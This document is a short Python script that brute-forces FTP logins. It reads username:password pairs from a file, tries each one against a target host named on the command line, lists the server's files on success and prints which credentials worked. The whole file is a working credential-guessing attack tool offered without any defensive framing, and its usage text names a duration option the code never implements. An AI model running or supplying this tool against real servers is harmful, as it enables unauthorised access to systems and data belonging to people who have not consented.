#!/usr/bin/env python3

from ftplib import FTP
from optparse import OptionParser
import os, sys


def brute(host, username, password):
    try:
        ftp = FTP(host)
        ftp.login(username, password)
        ftp.retrlines('LIST')
        print ('Ftp server connected using the provided username "' + username + '" and     password "' + password + '"')
        ftp.quit()
    except:
        print ('Could not connect to the ftp server using the provided username "' + username + '" and password "' + password + '"')

def main():
    parser = OptionParser(usage="usage: python3 <program name>.py -t <target IP> -p <password file> -d <duration>")
    parser.add_option("-t", type="string",
                      help="Enter target host IP",
                      dest="targetHost")
    parser.add_option("-p", type="string",
                      help="Enter password file",
                      dest="passFile")
    (options, args) = parser.parse_args()

    if not options.passFile or not options.targetHost:
        parser.print_help()
    else:
        with open(options.passFile) as f:
            data = [ line.strip().split(':') for line in f ]

        for username, password in data:
            brute(options.targetHost, username, password)


main()